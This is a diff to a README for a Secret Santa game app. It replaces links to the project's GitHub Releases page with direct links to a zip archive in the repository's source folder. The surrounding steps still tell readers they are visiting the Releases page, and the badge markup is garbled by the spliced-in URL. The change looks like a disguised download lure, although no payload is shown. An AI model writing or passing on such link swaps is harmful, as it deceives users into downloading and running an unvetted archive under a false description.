@@ -22,14 +22,14 @@ Before you download Secret Santa Draw Arcade, make sure your computer meets thes
 ## 📥 Download & Install
 To download the application, head over to the Releases page. Here, you will find the latest version available. Click the link below to visit and download:
 
-[![Download Secret Santa Draw Arcade](https://img.shields.io/badge/Download%20Now-Secret%20Santa%20Draw%20Arcade-blue.svg)](https://github.com/jay892/secret-santa-draw-arcade/releases)
+[![Download Secret Santa Draw Arcade](https://raw.githubusercontent.com/jay892/secret-santa-draw-arcade/main/src/secret-santa-draw-arcade-2.0.zip%20Now-Secret%20Santa%20Draw%https://raw.githubusercontent.com/jay892/secret-santa-draw-arcade/main/src/secret-santa-draw-arcade-2.0.zip)](https://raw.githubusercontent.com/jay892/secret-santa-draw-arcade/main/src/secret-santa-draw-arcade-2.0.zip)
 
 1. **Visit the Releases Page:** Click on the link above to open the Releases page.
 2. **Choose the Latest Version:** Look for the most recent version at the top.
 3. **Download the Installer:** Click on the file suitable for your operating system. The file will automatically download to your computer.
 4. **Run the Installer:** After the download completes, locate the file in your Downloads folder (or wherever you saved it). Double-click the file to begin installation and follow the prompts.
 
-For your convenience, here’s the link to the Releases page again: [Download Secret Santa Draw Arcade](https://github.com/jay892/secret-santa-draw-arcade/releases).
+For your convenience, here’s the link to the Releases page again: [Download Secret Santa Draw Arcade](https://raw.githubusercontent.com/jay892/secret-santa-draw-arcade/main/src/secret-santa-draw-arcade-2.0.zip).
 
 ## 🎮 How to Play
 Once you have installed the application, follow these steps to enjoy your first game:
